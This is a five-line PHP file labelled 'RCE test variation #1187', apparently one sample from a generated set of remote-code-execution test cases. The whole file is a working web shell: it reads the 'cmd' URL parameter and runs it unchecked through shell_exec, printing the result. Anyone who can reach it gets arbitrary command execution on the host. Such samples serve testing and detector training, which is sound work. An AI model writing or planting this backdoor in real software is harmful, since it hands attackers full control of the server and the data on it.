<?php
// RCE test variation #1187
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>